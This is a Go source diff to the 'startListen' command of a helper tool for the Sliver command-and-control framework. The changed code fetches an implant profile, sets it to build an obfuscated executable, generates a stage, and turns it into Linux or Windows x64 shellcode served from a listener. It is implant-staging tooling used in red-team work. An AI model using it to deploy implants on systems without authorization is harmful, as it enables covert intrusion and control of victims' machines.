@@ -2,16 +2,18 @@ package starListen
 
 import (
 	ctx "context"
+	"encoding/json"
 	"net/url"
 	"os"
 	"strconv"
+	"time"
 
 	c "github.com/Esonhugh/sliver-stage-helper/cmd/sliverStager/cmd"
 	"github.com/Esonhugh/sliver-stage-helper/pkg/shellcoder"
-	"github.com/bishopfox/sliver/protobuf/clientpb"
-	"github.com/bishopfox/sliver/server/generate"
+	"github.com/Esonhugh/sliver-stage-helper/pkg/sliverClient/protobuf/clientpb"
 	"github.com/sirupsen/logrus"
 	"github.com/spf13/cobra"
+	"golang.org/x/net/context"
 )
 
 func init() {
@@ -19,6 +21,7 @@ func init() {
 	StartListenCmd.Flags().StringVarP(&Opt.BeaconProfile, "profile", "p", "default", "beacon profile")
 	StartListenCmd.Flags().StringVarP(&Opt.RawBytesFromFile, "rawBytesFromFile", "r", "", "raw bytes from file")
 	StartListenCmd.Flags().StringVarP(&Opt.StageName, "stageName", "s", "helper-built-stager", "stage name")
+	c.RootCmd.AddCommand(StartListenCmd)
 }
 
 var log = logrus.WithField("cmd", "startListen")
@@ -34,11 +37,20 @@ var Opt = struct {
 	port   uint32
 }{}
 
+func toJson(v interface{}) string {
+	s, _ := json.MarshalIndent(v, "", "  ")
+	return string(s)
+}
+
 var StartListenCmd = &cobra.Command{
 	Use:   "startListen",
 	Short: "startListen",
 	Long:  "startListen",
 	PreRun: func(cmd *cobra.Command, args []string) {
+		if Opt.ListenUrl == "" {
+			log.Fatal("listen url is required")
+			return
+		}
 		u, err := url.Parse(Opt.ListenUrl)
 		if err != nil {
 			log.Fatalf("invalid listener URL: %v", err)
@@ -75,25 +87,42 @@ var StartListenCmd = &cobra.Command{
 				return
 			}
 		} else if Opt.BeaconProfile != "" {
+			log.Infof("Try to get implant profile %s", Opt.BeaconProfile)
 			profile := c.Client.GetImplantProfileByName(Opt.BeaconProfile)
 			if profile == nil {
 				log.Fatalf("profile %s not found", Opt.BeaconProfile)
 				return
 			}
+			log.Debugf("Got implant profile %s, config: %v", Opt.BeaconProfile, toJson(profile))
+			log.Infof("Start generate a new profile")
+			profile.Name = profile.Name + "-stagered"
 			profile.Config.Format = clientpb.OutputFormat_EXECUTABLE
 			profile.Config.ObfuscateSymbols = true
-			profile, err := c.Client.SaveImplantProfile(ctx.Background(), &clientpb.ImplantProfile{
-				Name:   profile.Name + "-stager",
-				Config: profile.Config,
-			})
+
+			profile, err := c.Client.SaveImplantProfile(ctx.Background(), profile)
 			if err != nil {
 				log.Fatalf("save stager implant profile failed: %v", err)
 				return
 			}
+			log.Infof("Saved implant profile %s", profile.Name)
 
-			gen, err := c.Client.GenerateStage(ctx.Background(), &clientpb.GenerateStageReq{
-				Profile: profile.Name,
-				Name:    Opt.StageName,
+			start := time.Now()
+			log.Infof("start generating executeable at %v", start.Format("2006-01-02 15:04:05"))
+			log.Debugf("current profile config: \n%v", toJson(profile))
+			/*
+				gen, err := c.Client.Generate(context.Background(), &clientpb.GenerateReq{
+					Name:   profile.Name,
+					Config: profile.Config,
+				})
+			*/
+			gen, err := c.Client.GenerateStage(context.Background(), &clientpb.GenerateStageReq{
+				Profile:       profile.Name,
+				Name:          "",
+				AESEncryptKey: "",
+				AESEncryptIv:  "",
+				RC4EncryptKey: "",
+				PrependSize:   false,
+				Compress:      "none",
 			})
 			if err != nil {
 				log.Fatalf("generate stage failed: %v", err)
@@ -106,9 +135,9 @@ var StartListenCmd = &cobra.Command{
 			}
 
 			switch profile.Config.GOOS {
-			case generate.LINUX:
+			case "linux":
 				in.Data, err = shellcoder.GenerateLinuxX64ShellcodeFromBytes(data)
-			case generate.WINDOWS:
+			case "windows":
 				data, err = shellcoder.GenerateWindowsX64ShellcodeFromBytes(data)
 				in.Data = data
 			default:
